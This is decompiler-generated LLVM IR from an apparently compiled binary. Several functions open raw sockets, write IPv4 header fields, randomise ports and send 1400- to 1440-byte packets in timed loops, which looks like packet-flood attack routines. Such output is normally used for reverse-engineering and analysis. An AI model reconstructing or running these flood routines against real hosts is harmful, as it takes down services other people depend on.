  br i1 %tmp, label %dec_label_pc_a0f0, label %dec_label_pc_a0bc

dec_label_pc_a0bc:                                ; preds = %dec_label_pc_9fcc
  %v2_a0c0 = call i32 @function_cb74(i32* null)
  store i32 %v2_a0c0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d4c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0d4, i32* %r3.global-to-local, align 4
  %v3_a0d8 = icmp ult i32 %v2_a0c0, %v2_a0d4
  br i1 %v3_a0d8, label %dec_label_pc_a0e8, label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_a0e8

dec_label_pc_a0e8:                                ; preds = %dec_label_pc_a0bc, %dec_label_pc_a0e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_9fcc, %dec_label_pc_a0e8
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_9fcc ], [ 0, %dec_label_pc_a0e8 ]
  %v1_a0f4 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9f54

dec_label_pc_a100:                                ; preds = %dec_label_pc_9d1c
  ret i32 %v1_9d5c

; uselistorder directives
  uselistorder i32 %v1_a048, { 1, 0 }
  uselistorder i32 %v0_a00c, { 1, 0 }
  uselistorder i32 %v3_9ff4, { 1, 0 }
  uselistorder i32 %v1_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc4, { 1, 0 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v3_9fa0, { 1, 0 }
  uselistorder i32 %v1_9f94, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 2 }
  uselistorder i32 %v3_9f88, { 1, 0 }
  uselistorder i8* %v4_9fc0, { 1, 0 }
  uselistorder i32 %v4_9f2c, { 3, 4, 1, 6, 0, 2, 5, 8, 7 }
  uselistorder i32 %v1_9f28, { 1, 0 }
  uselistorder i32 %v3_9f1c, { 1, 0 }
  uselistorder i8* %tmp42, { 1, 2, 0 }
  uselistorder i32 %v2_9e1c, { 15, 1, 16, 3, 5, 17, 0, 2, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32 %v2_9dec, { 1, 0, 2 }
  uselistorder i32 %v2_9d4c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 17, 18, 13, 14, 15, 16, 19, 21, 22, 20, 23, 30, 24, 26, 27, 25, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a0f0, { 1, 0 }
  uselistorder label %dec_label_pc_a0e8, { 1, 0 }
  uselistorder label %dec_label_pc_9fcc, { 1, 0 }
  uselistorder label %dec_label_pc_9dbc, { 1, 0 }
  uselistorder label %dec_label_pc_9d98, { 1, 0 }
}

define i32 @function_a110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a110:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a114 = load i32, i32* @fp, align 4
  store i32 %v3_a114, i32* %stack_var_-16, align 4
  store i32 41244, i32* %stack_var_-4, align 4
  %v13_a114 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a118, i32* @fp, align 4
  %v2_a134 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_a134, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15cc0.126 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a148 = call i32 @function_ec10()
  %v2_a160 = call i32 @function_cb74(i32* null)
  %v1_a170 = call i32 @function_83d8(i32 %arg2)
  %v2_a178 = icmp eq i32 %v1_a170, 0
  br i1 %v2_a178, label %dec_label_pc_a180, label %dec_label_pc_a6a4

dec_label_pc_a180:                                ; preds = %dec_label_pc_a110
  %v8_a188 = icmp sgt i32 %arg3, 2
  br i1 %v8_a188, label %dec_label_pc_a1a4, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a180
  store i32 %arg2, i32* @r2, align 4
  %v3_a198 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_15d10.128 to i32))
  %v1_a1a0 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a18c
  %v3_a1b0 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  %v1_a1c0 = icmp slt i32 %v3_a1b0, 0
  br i1 %v1_a1c0, label %dec_label_pc_a1c8, label %dec_label_pc_a224.preheader

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a1a4
  %v1_a1cc = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a224.preheader

dec_label_pc_a224.preheader:                      ; preds = %dec_label_pc_a1a4, %dec_label_pc_a1c8
  %v2_a1f0 = add i32 %v13_a114, -248
  %v2_a208 = add i32 %v13_a114, -60
  br label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a224.preheader, %dec_label_pc_a1dc
  %storemerge1516 = phi i32 [ 0, %dec_label_pc_a224.preheader ], [ %v1_a21c, %dec_label_pc_a1dc ]
  %v3_a1e8 = mul nuw nsw i32 %storemerge1516, 4
  %v2_a1f4 = add i32 %v2_a1f0, %v3_a1e8
  %v1_a1f8 = inttoptr i32 %v2_a1f4 to i32*
  %v2_a1f8 = load i32, i32* %v1_a1f8, align 4
  %v2_a20c = add i32 %v2_a208, %storemerge1516
  %v1_a214 = trunc i32 %v2_a1f8 to i8
  %v3_a214 = inttoptr i32 %v2_a20c to i8*
  store i8 %v1_a214, i8* %v3_a214, align 1
  %v1_a21c = add nuw nsw i32 %storemerge1516, 1
  %v7_a22c = icmp slt i32 %v1_a21c, 20
  br i1 %v7_a22c, label %dec_label_pc_a1dc, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a1dc
  %v1_a234 = add i32 %arg4, 4
  %v1_a238 = inttoptr i32 %v1_a234 to i32*
  %v2_a238 = load i32, i32* %v1_a238, align 4
  %v2_a244 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a238)
  %v1_a254 = add i32 %arg4, 12
  %v1_a258 = inttoptr i32 %v1_a254 to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a260 = inttoptr i32 %v2_a258 to i8*
  %v2_a260 = call i32 @function_10354(i8* %v1_a260)
  store i32 %arg2, i32* @r2, align 4
  %v3_a284 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_15d38.130 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a3b4 = add i32 %arg4, 8
  %v1_a3b8 = inttoptr i32 %v1_a3b4 to i32*
  %v2_a3b8 = load i32, i32* %v1_a3b8, align 4
  %v1_a3c0 = inttoptr i32 %v2_a3b8 to i8*
  %v2_a3c0 = call i32 @function_10354(i8* %v1_a3c0)
  %v3_a3cc = urem i32 %v2_a3c0, 65536
  %v1_a3d4 = call i32 @function_f294(i32 %v3_a3cc)
  %v2_a5c0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a5c8 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a5e0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a5e8 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a610 = bitcast i32* %stack_var_-168 to i8*
  %v2_a62c = ptrtoint i32* %stack_var_-184 to i32
  %v6_a650 = bitcast i8* %stack_var_-116 to i32*
  %v2_a678 = add i32 %v2_a260, %v2_a160
  br label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a230
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a230 ], [ %v1_a698, %dec_label_pc_a694 ]
  %v0_a3e0 = call i32 @function_fe50()
  %v2_a3f4 = load i32, i32* %v1_a3b8, align 4
  %v1_a3fc = inttoptr i32 %v2_a3f4 to i8*
  %v2_a3fc = call i32 @function_10354(i8* %v1_a3fc)
  %v2_a404 = icmp eq i32 %v2_a3fc, 0
  br i1 %v2_a404, label %dec_label_pc_a40c, label %dec_label_pc_a418

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e0
  %v0_a40c = call i32 @function_fe50()
  br label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3e0, %dec_label_pc_a40c
  %v0_a418 = call i32 @function_8548()
  %v1_a440 = call i32 @function_f294(i32 60)
  %v0_a454 = call i32 @function_fe50()
  %v3_a494 = urem i32 %v0_a3e0, 65536
  store i32 %v3_a494, i32* %stack_var_-96, align 4
  %v0_a4bc = call i32 @function_fe50()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a510 = call i32 @function_8cc4(i8* nonnull %stack_var_-116, i32 20)
  %v0_a524 = call i32 @function_fe50()
  store i32 %v0_a418, i32* %stack_var_-168, align 4
  %v1_a5a8 = call i32 @function_f294(i32 40)
  store i32 20, i32* @r2, align 4
  %v3_a5d8 = call i32 @function_ec00(i32 %v2_a5c0, i32 %v2_a5c8, i32 20)
  store i32 20, i32* @r2, align 4
  %v3_a5f8 = call i32 @function_ec00(i32 %v2_a5e0, i32 %v2_a5e8, i32 20)
  %v3_a610 = call i32 @function_8cc4(i8* %v2_a610, i32 52)
  %v7_a650 = call i32 @function_f878(i32 %v3_a1b0, i32* %v6_a650, i32 60, i32 0, i32 %v2_a62c, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a694, label %dec_label_pc_a660

dec_label_pc_a660:                                ; preds = %dec_label_pc_a418
  %v2_a664 = call i32 @function_cb74(i32* null)
  %v3_a67c = icmp ult i32 %v2_a664, %v2_a678
  br i1 %v3_a67c, label %dec_label_pc_a68c, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a660
  %v1_a688 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a660, %dec_label_pc_a684
  br label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a68c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a418 ], [ 0, %dec_label_pc_a68c ]
  %v1_a698 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a3e0

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a110
  ret i32 %v1_a170

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1516, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a694, { 1, 0 }
  uselistorder label %dec_label_pc_a68c, { 1, 0 }
  uselistorder label %dec_label_pc_a418, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0 }
  uselistorder label %dec_label_pc_a224.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a1a4, { 1, 0 }
}

define i32 @function_a6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a6b8:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42692, i32* %stack_var_-4, align 4
  %v2_a6c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a6c0, i32* @fp, align 4
  %v2_a6e8 = call i32 @function_cb74(i32* null)
  %v1_a6f8 = call i32 @function_83d8(i32 %arg2)
  %v2_a700 = icmp eq i32 %v1_a6f8, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_ab8c

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6b8
  %v8_a710 = icmp sgt i32 %arg3, 1
  br i1 %v8_a710, label %dec_label_pc_a72c, label %dec_label_pc_a714

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708
  store i32 %arg2, i32* @r2, align 4
  %v3_a720 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_15d50.132 to i32))
  %v1_a728 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a708, %dec_label_pc_a714
  %v1_a730 = add i32 %arg4, 8
  %v1_a734 = inttoptr i32 %v1_a730 to i32*
  %v2_a734 = load i32, i32* %v1_a734, align 4
  %v1_a73c = inttoptr i32 %v2_a734 to i8*
  %v2_a73c = call i32 @function_10354(i8* %v1_a73c)
  %v3_a754 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  %v1_a764 = icmp slt i32 %v3_a754, 0
  br i1 %v1_a764, label %dec_label_pc_a76c, label %dec_label_pc_a774

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a72c
  %v1_a770 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a76c
  %v2_a778 = call i32 @function_cb74(i32* null)
  store i32 %v2_a778, i32* @r4, align 4
  %v0_a780 = call i32 @function_ca70()
  %v0_a788 = load i32, i32* @r4, align 4
  %v2_a788 = xor i32 %v0_a788, %v0_a780
  %v1_a790 = call i32 @function_fff4(i32 %v2_a788)
  %v0_a794 = call i32 @function_fe50()
  %v2_a7a0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a7b0 = bitcast i32* %stack_var_-72 to i8*
  %v3_a7b0 = call i32 @function_ec20(i8* %v2_a7b0, i32 %v0_a794)
  %v1_a7b8 = add i32 %arg4, 4
  %v1_a7bc = inttoptr i32 %v1_a7b8 to i32*
  %v2_a7bc = load i32, i32* %v1_a7bc, align 4
  %v2_a7c8 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a7bc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a7ec = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_15d74.134 to i32))
  %v2_aaa0 = ptrtoint i32* %stack_var_-92 to i32
  %v2_aaa8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_aac8 = ptrtoint i32* %stack_var_-132 to i32
  %v2_aaf0 = bitcast i32* %stack_var_-164 to i8*
  %v2_ab0c = ptrtoint i32* %stack_var_-180 to i32
  %v6_ab30 = bitcast i8* %stack_var_-112 to i32*
  %v2_ab58 = add i32 %v2_a73c, %v2_a6e8
  br label %dec_label_pc_a7f0

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_a774
  %stack_var_-44.0 = phi i32 [ %tmp21, %dec_label_pc_a774 ], [ %v1_ab70, %dec_label_pc_ab6c ]
  %v0_a7f0 = call i32 @function_8548()
  store i8 69, i8* %stack_var_-112, align 1
  %v1_a860 = call i32 @function_f294(i32 1440)
  %v0_a874 = call i32 @function_fe50()
  %v0_a8cc = call i32 @function_fe50()
  %v3_a8d8 = urem i32 %v0_a8cc, 65536
  store i32 %v3_a8d8, i32* %stack_var_-92, align 4
  %v0_a8e8 = call i32 @function_fe50()
  %v0_a904 = call i32 @function_fe50()
  %v0_a910 = call i32 @function_fe50()
  store i32 2, i32* %stack_var_-180, align 4
  %v3_aa20 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 20)
  %v3_aa40 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 40)
  store i32 %v0_a7f0, i32* %stack_var_-164, align 4
  %v1_aa88 = call i32 @function_f294(i32 1420)
  store i32 20, i32* @r2, align 4
  %v3_aab8 = call i32 @function_ec00(i32 %v2_aaa0, i32 %v2_aaa8, i32 20)
  store i32 1400, i32* @r2, align 4
  %v3_aad8 = call i32 @function_ec00(i32 %v2_a7a0, i32 %v2_aac8, i32 1400)
  %v3_aaf0 = call i32 @function_8cc4(i8* %v2_aaf0, i32 1432)
  %v7_ab30 = call i32 @function_f878(i32 %v3_a754, i32* %v6_ab30, i32 1440, i32 0, i32 %v2_ab0c, i32 16)
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_ab6c, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_a7f0
  %v2_ab44 = call i32 @function_cb74(i32* null)
  %v3_ab5c = icmp ult i32 %v2_ab44, %v2_ab58
  br i1 %v3_ab5c, label %dec_label_pc_ab64, label %dec_label_pc_ab7c

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  br label %dec_label_pc_ab6c

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_a7f0, %dec_label_pc_ab64
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_a7f0 ], [ 0, %dec_label_pc_ab64 ]
  %v1_ab70 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_a7f0

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab40
  %v1_ab80 = call i32 @function_ca18(i32 %v3_a754)
  %v1_ab88 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_ab7c
  %v12_ab90 = phi i32 [ %v1_a6f8, %dec_label_pc_a6b8 ], [ %v1_ab88, %dec_label_pc_ab7c ]
  ret i32 %v12_ab90

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-112, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_8548, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9c5c, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_83d8, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_ab6c, { 1, 0 }
  uselistorder label %dec_label_pc_a774, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
}

define i32 @function_b84c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b84c:
  %stack_var_-4 = alloca i32, align 4
  store i32 47192, i32* %stack_var_-4, align 4
  %v2_b854 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b854, i32* @fp, align 4
  %v2_b86c = load i32, i32* @global_var_1abf4.187, align 4
  store i32 %v2_b86c, i32* @r2, align 4
  %v3_b87c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_16540.208 to i32))
  %v2_b884 = load i32, i32* @global_var_1ad08.185, align 4
  store i32 %v2_b884, i32* @r2, align 4
  %v3_b898 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_16550.213 to i32))
  %v2_b8a0 = load i32, i32* @global_var_1abf4.187, align 4
  store i32 %v2_b8a0, i32* @r2, align 4
  %v3_b8b0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_16560.215 to i32))
  ret i32 %v3_b8b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_b8d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8d4:
  %stack_var_-4 = alloca i32, align 4
  store i32 47328, i32* %stack_var_-4, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b8dc, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b8fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_16568.217 to i32))
  ret i32 %v3_b8fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b90c(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b90c:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 47384, i32* %stack_var_-4, align 4
  %v2_b914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b914, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_b95c.preheader

dec_label_pc_b944:                                ; preds = %dec_label_pc_b974
  %v1_b948 = add i32 %.pre, 1
  %v5_b94c = inttoptr i32 %v1_b948 to i8*
  %v1_b954 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c.preheader, %dec_label_pc_b944
  %stack_var_-36.0 = phi i32 [ %v1_b954, %dec_label_pc_b944 ], [ %stack_var_-36.118, %dec_label_pc_b95c.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_b94c, %dec_label_pc_b944 ], [ %stack_var_-28.119, %dec_label_pc_b95c.preheader ]
  %v3_b960 = load i8*, i8** %stack_var_-52, align 4
  %v4_b960 = ptrtoint i8* %v3_b960 to i32
  store i32 %v4_b960, i32* @r0, align 4
  %v0_b964 = call i32 @function_ecc0()
  %v3_b96c = icmp ult i32 %stack_var_-36.0, %v0_b964
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_b96c, label %dec_label_pc_b974, label %dec_label_pc_b984

dec_label_pc_b974:                                ; preds = %dec_label_pc_b95c
  %v2_b978 = load i8, i8* %stack_var_-28.0, align 1
  %v7_b97c = icmp eq i8 %v2_b978, 32
  br i1 %v7_b97c, label %dec_label_pc_b984, label %dec_label_pc_b944

dec_label_pc_b984:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_b974
  %v1_b988 = add i32 %.pre, 1
  %v3_b994 = load i8*, i8** %stack_var_-52, align 4
  %v4_b994 = ptrtoint i8* %v3_b994 to i32
  store i32 %v4_b994, i32* @r0, align 4
  %v0_b998 = call i32 @function_ecc0()
  %v9_b9a0 = icmp eq i32 %stack_var_-36.0, %v0_b998
  br i1 %v9_b9a0, label %dec_label_pc_bc24, label %dec_label_pc_b9a8

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b984
  %v5_b98c = inttoptr i32 %v1_b988 to i8*
  %v1_b9ac = add nuw nsw i32 %storemerge820, 1
  %v7_b9bc = icmp slt i32 %v1_b9ac, 5
  br i1 %v7_b9bc, label %dec_label_pc_b95c.preheader, label %dec_label_pc_b9d8

dec_label_pc_b95c.preheader:                      ; preds = %dec_label_pc_b90c, %dec_label_pc_b9a8
  %storemerge820 = phi i32 [ 0, %dec_label_pc_b90c ], [ %v1_b9ac, %dec_label_pc_b9a8 ]
  %stack_var_-28.119 = phi i8* [ %arg3, %dec_label_pc_b90c ], [ %v5_b98c, %dec_label_pc_b9a8 ]
  %stack_var_-36.118 = phi i32 [ 0, %dec_label_pc_b90c ], [ %stack_var_-36.0, %dec_label_pc_b9a8 ]
  br label %dec_label_pc_b95c

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9f0
  %v1_b9d0 = add i32 %storemerge9, 1
  br label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9a8, %dec_label_pc_b9cc
  %storemerge9 = phi i32 [ %v1_b9d0, %dec_label_pc_b9cc ], [ 0, %dec_label_pc_b9a8 ]
  store i32 %storemerge9, i32* @r4, align 4
  store i32 %v1_b988, i32* @r0, align 4
  %v0_b9e0 = call i32 @function_ecc0()
  %v0_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = icmp ult i32 %v0_b9e8, %v0_b9e0
  br i1 %v3_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge

dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge:    ; preds = %dec_label_pc_b9d8
  %.pre26 = add i32 %storemerge9, %v1_b988
  %.pre27 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_ba0c

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9d8
  %v2_b9fc = add i32 %storemerge9, %v1_b988
  %v1_ba00 = inttoptr i32 %v2_b9fc to i8*
  %v2_ba00 = load i8, i8* %v1_ba00, align 1
  %v7_ba04 = icmp eq i8 %v2_ba00, 32
  br i1 %v7_ba04, label %dec_label_pc_ba0c, label %dec_label_pc_b9cc

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9f0, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge
  %v3_ba20.pre-phi = phi i8* [ %.pre27, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge ], [ %v1_ba00, %dec_label_pc_b9f0 ]
  store i8 0, i8* %v3_ba20.pre-phi, align 1
  %v2_ba28 = load i32, i32* @global_var_1abf4.187, align 4
  %v4_ba34 = call i32 @function_f0f4(i8* %v5_b98c, i32 %v2_ba28)
  %v2_ba3c = icmp eq i32 %v4_ba34, 0
  br i1 %v2_ba3c, label %dec_label_pc_ba44, label %dec_label_pc_bc24

dec_label_pc_ba44:                                ; preds = %dec_label_pc_ba0c
  %v2_ba48 = load i32, i32* @global_var_1847c.35, align 4
  %v2_ba4c = icmp eq i32 %v2_ba48, 0
  br i1 %v2_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_bc24

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba44
  %v3_ba54 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_ba88.preheader

dec_label_pc_ba70:                                ; preds = %dec_label_pc_baa0
  %v1_ba74 = add i32 %.pre28, 1
  %v5_ba78 = inttoptr i32 %v1_ba74 to i8*
  %v1_ba80 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_ba88

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba88.preheader, %dec_label_pc_ba70
  %stack_var_-36.2 = phi i32 [ %v1_ba80, %dec_label_pc_ba70 ], [ %stack_var_-36.315, %dec_label_pc_ba88.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_ba78, %dec_label_pc_ba70 ], [ %stack_var_-28.316, %dec_label_pc_ba88.preheader ]
  %v3_ba8c = load i8*, i8** %stack_var_-52, align 4
  %v4_ba8c = ptrtoint i8* %v3_ba8c to i32
  store i32 %v4_ba8c, i32* @r0, align 4
  %v0_ba90 = call i32 @function_ecc0()
  %v3_ba98 = icmp ult i32 %stack_var_-36.2, %v0_ba90
  %.pre28 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_ba98, label %dec_label_pc_baa0, label %dec_label_pc_bab0

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba88
  %v2_baa4 = load i8, i8* %stack_var_-28.2, align 1
  %v7_baa8 = icmp eq i8 %v2_baa4, 32
  br i1 %v7_baa8, label %dec_label_pc_bab0, label %dec_label_pc_ba70

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba88, %dec_label_pc_baa0
  %v1_bab4 = add i32 %.pre28, 1
  %v3_bac0 = load i8*, i8** %stack_var_-52, align 4
  %v4_bac0 = ptrtoint i8* %v3_bac0 to i32
  store i32 %v4_bac0, i32* @r0, align 4
  %v0_bac4 = call i32 @function_ecc0()
  %v9_bacc = icmp eq i32 %stack_var_-36.2, %v0_bac4
  br i1 %v9_bacc, label %dec_label_pc_bc24, label %dec_label_pc_bad4

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bab0
  %v5_bab8 = inttoptr i32 %v1_bab4 to i8*
  %v1_bad8 = add nuw nsw i32 %storemerge1017, 1
  %v7_bae8 = icmp slt i32 %v1_bad8, 3
  br i1 %v7_bae8, label %dec_label_pc_ba88.preheader, label %dec_label_pc_bb04

dec_label_pc_ba88.preheader:                      ; preds = %dec_label_pc_ba54, %dec_label_pc_bad4
  %storemerge1017 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %v1_bad8, %dec_label_pc_bad4 ]
